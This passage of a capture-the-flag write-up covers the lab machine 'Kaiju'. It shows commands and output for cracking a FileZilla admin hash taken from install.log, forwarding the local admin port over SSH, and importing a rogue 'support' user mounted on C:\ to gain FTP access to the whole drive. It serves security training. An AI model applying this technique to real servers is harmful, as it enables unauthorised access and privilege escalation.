<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">gui</span><span class="o">.</span><span class="n">exe</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">impersonator</span><span class="o">.</span><span class="n">exe</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">.</span><span class="n">exe</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">install</span><span class="o">.</span><span class="n">log</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libfilezilla</span><span class="o">-</span><span class="mf">41.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libgcc_s_seh</span><span class="o">-</span><span class="mf">1.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libgmp</span><span class="o">-</span><span class="mf">10.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libgnutls</span><span class="o">-</span><span class="mf">30.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libhogweed</span><span class="o">-</span><span class="mf">6.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libnettle</span><span class="o">-</span><span class="mf">8.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libpng16</span><span class="o">-</span><span class="mf">16.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">libstdc</span><span class="o">++-</span><span class="mf">6.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">NEWS</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">Uninstall</span><span class="o">.</span><span class="n">exe</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">wxbase32u_gcc_custom</span><span class="o">.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">wxmsw32u_core_gcc_custom</span><span class="o">.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">zlib1</span><span class="o">.</span><span class="n">dll</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>
<span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">Logs</span>
<span class="n">‚îÇ</span>           <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">.</span><span class="n">log</span>
<span class="n">‚îÇ</span>
<span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">PuTTY</span>
        <span class="n">LICENCE</span>
        <span class="n">pageant</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">plink</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">pscp</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">psftp</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">putty</span><span class="o">.</span><span class="n">chm</span>
        <span class="n">putty</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">puttygen</span><span class="o">.</span><span class="n">exe</span>
        <span class="n">README</span><span class="o">.</span><span class="n">txt</span>
        <span class="n">website</span><span class="o">.</span><span class="n">url</span>


<span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span><span class="o">&gt;</span>
</pre></div>
<p>As expected, this directory contains the installation folders for PuTTY and FileZilla. Inside the FileZilla installation directory, there‚Äôs an interesting file named <code>install.log</code>. Along with the usual installation logs, FileZilla also stores the admin user‚Äôs password in this file, by default in a hashed form.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">install</span><span class="o">.</span><span class="n">log</span>
<span class="n">Create</span> <span class="n">folder</span><span class="p">:</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span>\<span class="n">Logs</span>
<span class="n">Output</span> <span class="n">folder</span><span class="p">:</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span>
<span class="n">Created</span> <span class="n">uninstaller</span><span class="p">:</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span>\<span class="n">Uninstall</span><span class="o">.</span><span class="n">exe</span>
<span class="n">Output</span> <span class="n">folder</span><span class="p">:</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span>
<span class="n">Extract</span><span class="p">:</span> <span class="n">libfilezilla</span><span class="o">-</span><span class="mf">41.</span><span class="n">dll</span>
<span class="n">Extract</span><span class="p">:</span> <span class="n">libgcc_s_seh</span><span class="o">-</span><span class="mf">1.</span><span class="n">dll</span>
<span class="n">Extract</span><span class="p">:</span> <span class="n">libgmp</span><span class="o">-</span><span class="mf">10.</span><span class="n">dll</span>
<span class="n">Extract</span><span class="p">:</span> <span class="n">libgnutls</span><span class="o">-</span><span class="mf">30.</span><span class="n">dll</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Server</span>\<span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">.</span><span class="n">exe</span>
<span class="n">Service</span> <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span> <span class="n">successfully</span> <span class="n">created</span><span class="o">.</span>
<span class="n">CheckConfigVersion</span><span class="p">:</span> <span class="n">got</span> <span class="p">[</span><span class="n">ok</span>
<span class="p">]</span>
<span class="n">Delete</span> <span class="n">file</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">ADMINI</span><span class="o">~</span><span class="mi">1</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Temp</span>\<span class="mi">1</span>\<span class="n">nsxEDF4</span><span class="o">.</span><span class="n">tmp</span>
<span class="n">Crypt</span> <span class="n">output</span><span class="p">:</span> <span class="p">[</span><span class="o">--</span><span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="n">@index</span><span class="o">=</span><span class="mi">1</span> <span class="o">--</span><span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">hash</span><span class="o">=</span><span class="n">mSbrgj1R6</span><span class="o">**********</span><span class="n">TuYTchS5r8Yk3Y5vsBgf2tF8</span> <span class="o">--</span><span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">salt</span><span class="o">=</span><span class="n">AdRNx7rAs</span><span class="o">**********</span><span class="mi">7</span><span class="n">NyAQYHcuo2LuevU3pAXKB18</span> <span class="o">--</span><span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">]</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
</pre></div>
<p>Let‚Äôs try to crack this hash using the same wordlist we used earlier:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">10900</span> <span class="o">-</span><span class="n">a0</span> <span class="n">hash_admin</span> <span class="n">wordlist</span><span class="o">.</span><span class="n">txt</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>          

<span class="n">sha256</span><span class="p">:</span><span class="mi">100000</span><span class="p">:</span><span class="n">AdRNx7rAs</span><span class="o">**********</span><span class="mi">7</span><span class="n">NyAQYHcuo2LuevU3pAXKB18</span><span class="p">:</span><span class="n">mSbrgj1R6</span><span class="o">**********</span><span class="n">TuYTchS5r8Yk3Y5vsBgf2tF8</span><span class="p">:</span><span class="n">k</span><span class="o">******</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
</pre></div>
<p>It worked! We‚Äôve successfully cracked the admin user‚Äôs password. But how can we leverage this?</p><br/>
<h3>FileZilla Administration Interface - Port 14148</h3><br/>
<p>FileZilla Server, by default, provides an administration interface that allows administrators to remotely connect to and manage the FileZilla Server application. Through this interface, one can configure server settings, manage user accounts, define shared directories, and monitor active connections. This service typically listens on port <strong>14148</strong> by default. To access it, valid administrator credentials are required, which we‚Äôve just obtained.</p><br/>
<p>When listing the open ports on the machine and filtering for port <strong>14148</strong>, we can see that this interface is only accessible from localhost. This means we cannot reach the service directly from our attacker machine:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span> <span class="o">|</span> <span class="n">findstr</span> <span class="mi">14148</span>
  <span class="n">TCP</span>    <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">14148</span>        <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">3884</span>
  <span class="n">TCP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">14148</span>            <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>       <span class="mi">3884</span>

<span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">FileZilla</span> <span class="n">Server</span><span class="o">&gt;</span>
</pre></div>
<p>However, since we already have access to the system, we can set up local port forwarding. We can leverage SSH <code>-L</code> parameter for this, so no external tools are needed.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">backup</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">L</span> <span class="mi">14148</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">14148</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span>
</pre></div>
<p>Now, when listing the open ports on our machine, we can see that port <strong>14148</strong> is open. All traffic sent to this port is being forwarded to port <strong>14148</strong> on the victim machine.</p><br/>
<p>Now that we can directly interact with the administration interface, how do we actually communicate with it? To do this, we need to download the FileZilla Server GUI, which allows us to connect to the administration interface. It‚Äôs important to note that the GUI version must match the victim‚Äôs FileZilla Server version exactly, otherwise, the connection will fail. In this case, the server is running <code>FileZilla Server 1.8.0</code>, so I downloaded and installed the same version on my Windows VM.</p><br/>
<p>Of course, if you want to interact with this server, you‚Äôll need to connect your Windows VM to the VulnLab VPN. You‚Äôll also have to set up the local port forwarding tunnel. Alternatively, you can expose the local port forwarding tunnel on <code>0.0.0.0</code> (all interfaces) and then connect from your Windows VM to port <strong>14148</strong> on the Linux VM (that's the approach I used).</p><br/>
<div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">backup</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">L</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">14148</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">14148</span>
</pre></div>
<p>Once you open the program, you'll see the following interface:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-1.png"/></p>
<p>Click the <code>Connect to Server</code> button and enter the credentials:
<p><img src="/writeups/vl/hard/kaiju/img/18-2.png" style="width: 20%"/></p>
<p>As shown, I specified the <code>192.168.100.1</code> host (my Linux VM) along with the password we cracked earlier. Then, I clicked <code>OK</code>, and if everything went well, the connection was established successfully:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-3.png"/></p>
<p>Great! We've successfully logged into the FileZilla Administration Interface. As mentioned earlier, this interface allows the administrator to configure the exposed directories, among other settings. This means that if we manage to import our own configuration, we could expose an arbitrary local directory through the FTP server, with the privileges of the user running the FileZilla Server.</p><br/>
<p>First, let's export the current configuration so we can modify it:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-4.png"/></p>
<p><img src="/writeups/vl/hard/kaiju/img/18-5.png" style="width: 20%"/></p>
<p>This exports everything into an XML file with the following content:</p><br/>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="nt">&lt;filezilla-server-exported</span><span class="w"> </span><span class="na">xmlns:fz=</span><span class="s">"https://filezilla-project.org"</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"https://filezilla-project.org"</span><span class="w"> </span><span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="w"> </span><span class="na">fz:product_flavour=</span><span class="s">"standard"</span><span class="w"> </span><span class="na">fz:product_version=</span><span class="s">"1.8.0"</span><span class="nt">&gt;</span>
...[snip]...
<span class="w">    </span><span class="nt">&lt;disallowed_ips&gt;&lt;/disallowed_ips&gt;</span>
<span class="w">    </span><span class="nt">&lt;allowed_ips&gt;&lt;/allowed_ips&gt;</span>
<span class="w">    </span><span class="nt">&lt;groups</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;users&gt;</span>
<span class="w">        </span><span class="nt">&lt;default_impersonator</span><span class="w"> </span><span class="na">index=</span><span class="s">"0"</span><span class="w"> </span><span class="na">enabled=</span><span class="s">"false"</span><span class="nt">&gt;</span>
<span class="w">            </span><span class="nt">&lt;name&gt;&lt;/name&gt;</span>
<span class="w">            </span><span class="nt">&lt;password&gt;&lt;/password&gt;</span>
<span class="w">        </span><span class="nt">&lt;/default_impersonator&gt;</span>
<span class="w">        </span><span class="nt">&lt;user</span><span class="w"> </span><span class="na">name=</span><span class="s">"&amp;lt;system user&gt;"</span><span class="w"> </span><span class="na">enabled=</span><span class="s">"false"</span><span class="nt">&gt;</span>
<span class="w">            </span><span class="nt">&lt;mount_point</span><span class="w"> </span><span class="na">tvfs_path=</span><span class="s">"/"</span><span class="w"> </span><span class="na">access=</span><span class="s">"1"</span><span class="w"> </span><span class="na">native_path=</span><span class="s">""</span><span class="w"> </span><span class="na">new_native_path=</span><span class="s">"%&amp;lt;home&gt;"</span><span class="w"> </span><span class="na">recursive=</span><span class="s">"2"</span><span class="w"> </span><span class="na">flags=</span><span class="s">"0"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;rate_limits</span><span class="w"> </span><span class="na">inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;allowed_ips&gt;&lt;/allowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;disallowed_ips&gt;&lt;/disallowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_open_limits</span><span class="w"> </span><span class="na">files=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">directories=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_count_limit&gt;</span>unlimited<span class="nt">&lt;/session_count_limit&gt;</span>
<span class="w">            </span><span class="nt">&lt;description&gt;</span>This<span class="w"> </span>user<span class="w"> </span>can<span class="w"> </span>impersonate<span class="w"> </span>any<span class="w"> </span>system<span class="w"> </span>user.<span class="nt">&lt;/description&gt;</span>
<span class="w">            </span><span class="nt">&lt;impersonation</span><span class="w"> </span><span class="na">login_only=</span><span class="s">"false"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;methods&gt;</span>1<span class="nt">&lt;/methods&gt;</span>
<span class="w">        </span><span class="nt">&lt;/user&gt;</span>
<span class="w">        </span><span class="nt">&lt;user</span><span class="w"> </span><span class="na">name=</span><span class="s">"backup"</span><span class="w"> </span><span class="na">enabled=</span><span class="s">"true"</span><span class="nt">&gt;</span>
<span class="w">            </span><span class="nt">&lt;mount_point</span><span class="w"> </span><span class="na">tvfs_path=</span><span class="s">"/"</span><span class="w"> </span><span class="na">access=</span><span class="s">"1"</span><span class="w"> </span><span class="na">native_path=</span><span class="s">""</span><span class="w"> </span><span class="na">new_native_path=</span><span class="s">"E:\Private"</span><span class="w"> </span><span class="na">recursive=</span><span class="s">"2"</span><span class="w"> </span><span class="na">flags=</span><span class="s">"0"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;rate_limits</span><span class="w"> </span><span class="na">inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;allowed_ips&gt;&lt;/allowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;disallowed_ips&gt;&lt;/disallowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_open_limits</span><span class="w"> </span><span class="na">files=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">directories=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_count_limit&gt;</span>unlimited<span class="nt">&lt;/session_count_limit&gt;</span>
<span class="w">            </span><span class="nt">&lt;description&gt;&lt;/description&gt;</span>
<span class="w">            </span><span class="nt">&lt;password</span><span class="w"> </span><span class="na">index=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="w">                </span><span class="nt">&lt;hash&gt;</span>ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU<span class="nt">&lt;/hash&gt;</span>
<span class="w">                </span><span class="nt">&lt;salt&gt;</span>aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw<span class="nt">&lt;/salt&gt;</span>
<span class="w">                </span><span class="nt">&lt;iterations&gt;</span>100000<span class="nt">&lt;/iterations&gt;</span>
<span class="w">            </span><span class="nt">&lt;/password&gt;</span>
<span class="w">            </span><span class="nt">&lt;methods&gt;</span>1<span class="nt">&lt;/methods&gt;</span>
<span class="w">        </span><span class="nt">&lt;/user&gt;</span>
...[snip]...<span class="nt">&lt;fingerprint&gt;</span>72:30:ea:81:80:0f:33:99:cc:70:52:1e:7c:bc:6f:ba:2c:4d:4b:0d:6f:bc:fe:61:7e:e6:c1:06:38:d5:3d:9d<span class="nt">&lt;/fingerprint&gt;</span>
<span class="w">            </span><span class="nt">&lt;/original&gt;</span>
...[snip]...
<span class="nt">&lt;/filezilla-server-exported&gt;</span>
</pre></div>
<p>It defines user and the directory access, similar to what we've seen earlier in the <code>users.xml</code> file. I'll add this setting following to the <code>backup</code> user definition:</p><br/>
<div class="highlight"><pre><span></span><span class="nt">&lt;user</span><span class="w"> </span><span class="na">name=</span><span class="s">"support"</span><span class="w"> </span><span class="na">enabled=</span><span class="s">"true"</span><span class="nt">&gt;</span>
<span class="w">            </span><span class="nt">&lt;mount_point</span><span class="w"> </span><span class="na">tvfs_path=</span><span class="s">"/"</span><span class="w"> </span><span class="na">access=</span><span class="s">"1"</span><span class="w"> </span><span class="na">native_path=</span><span class="s">""</span><span class="w"> </span><span class="na">new_native_path=</span><span class="s">"C:\"</span><span class="w"> </span><span class="na">recursive=</span><span class="s">"2"</span><span class="w"> </span><span class="na">flags=</span><span class="s">"0"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;rate_limits</span><span class="w"> </span><span class="na">inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_inbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">session_outbound=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;allowed_ips&gt;&lt;/allowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;disallowed_ips&gt;&lt;/disallowed_ips&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_open_limits</span><span class="w"> </span><span class="na">files=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="na">directories=</span><span class="s">"unlimited"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;session_count_limit&gt;</span>unlimited<span class="nt">&lt;/session_count_limit&gt;</span>
<span class="w">            </span><span class="nt">&lt;description&gt;&lt;/description&gt;</span>
<span class="w">            </span><span class="nt">&lt;password</span><span class="w"> </span><span class="na">index=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="w">                </span><span class="nt">&lt;hash&gt;</span>ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU<span class="nt">&lt;/hash&gt;</span>
<span class="w">                </span><span class="nt">&lt;salt&gt;</span>aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw<span class="nt">&lt;/salt&gt;</span>
<span class="w">                </span><span class="nt">&lt;iterations&gt;</span>100000<span class="nt">&lt;/iterations&gt;</span>
<span class="w">            </span><span class="nt">&lt;/password&gt;</span>
<span class="w">            </span><span class="nt">&lt;methods&gt;</span>1<span class="nt">&lt;/methods&gt;</span>
<span class="nt">&lt;/user&gt;</span>
</pre></div>
<p>Let's break down what this setting does. In simple terms, it creates a new user named <code>support</code>, who has access to the <code>C:\</code> directory. Essentially, the <code>support</code> user can access the entire C: drive (with the privileges of the user running the service). I simply reused the same password hash as the <code>backup</code> user, which means we can authenticate as <code>support</code> using the password <code>backup123</code>.</p><br/>
<p>Now, let's import this new configuration:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-6.png"/></p>
<p>At first glance, nothing seems to be broken. Let's see if we can access the FTP server using our new user <code>support</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ftp</span> <span class="n">support</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">Connected</span> <span class="n">to</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="o">.</span>
<span class="mi">220</span><span class="o">-</span><span class="n">FileZilla</span> <span class="n">Server</span> <span class="mf">1.8.0</span>
<span class="mi">220</span> <span class="n">Please</span> <span class="n">visit</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">filezilla</span><span class="o">-</span><span class="n">project</span><span class="o">.</span><span class="n">org</span><span class="o">/</span>
<span class="mi">331</span> <span class="n">Please</span><span class="p">,</span> <span class="n">specify</span> <span class="n">the</span> <span class="n">password</span><span class="o">.</span>
<span class="n">Password</span><span class="p">:</span> 
<span class="mi">230</span> <span class="n">Login</span> <span class="n">successful</span><span class="o">.</span>
<span class="n">Remote</span> <span class="n">system</span> <span class="nb">type</span> <span class="n">is</span> <span class="n">UNIX</span><span class="o">.</span>
<span class="n">Using</span> <span class="n">binary</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">transfer</span> <span class="n">files</span><span class="o">.</span>
<span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">ls</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65152</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">$</span><span class="n">Recycle</span><span class="o">.</span><span class="n">Bin</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">$</span><span class="n">WinREAgent</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Documents</span> <span class="n">and</span> <span class="n">Settings</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>           <span class="mi">12288</span> <span class="n">Sep</span> <span class="mi">09</span> <span class="mi">20</span><span class="p">:</span><span class="mi">51</span> <span class="n">DumpStack</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">tmp</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>      <span class="mi">1207959552</span> <span class="n">Sep</span> <span class="mi">09</span> <span class="mi">20</span><span class="p">:</span><span class="mi">51</span> <span class="n">pagefile</span><span class="o">.</span><span class="n">sys</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">PerfLogs</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">27</span>  <span class="mi">2023</span> <span class="n">Program</span> <span class="n">Files</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">27</span>  <span class="mi">2023</span> <span class="n">ProgramData</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Recovery</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">System</span> <span class="n">Volume</span> <span class="n">Information</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Sep</span> <span class="mi">09</span> <span class="mi">20</span><span class="p">:</span><span class="mi">52</span> <span class="n">Users</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">29</span>  <span class="mi">2023</span> <span class="n">Windows</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p>Nice! We've successfully accessed the FTP server as <code>support</code>, and we now have access to the C:\ drive. But how do we determine which user is running the FileZilla server, so we know where we can write? You can simply create a folder and then run <code>cacls</code> in the SSH console to list its privileges:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span><span class="n">cacls</span> <span class="n">test</span>
<span class="n">C</span><span class="p">:</span>\<span class="n">test</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span> 
        <span class="n">BUILTIN</span>\<span class="n">Administrators</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span>
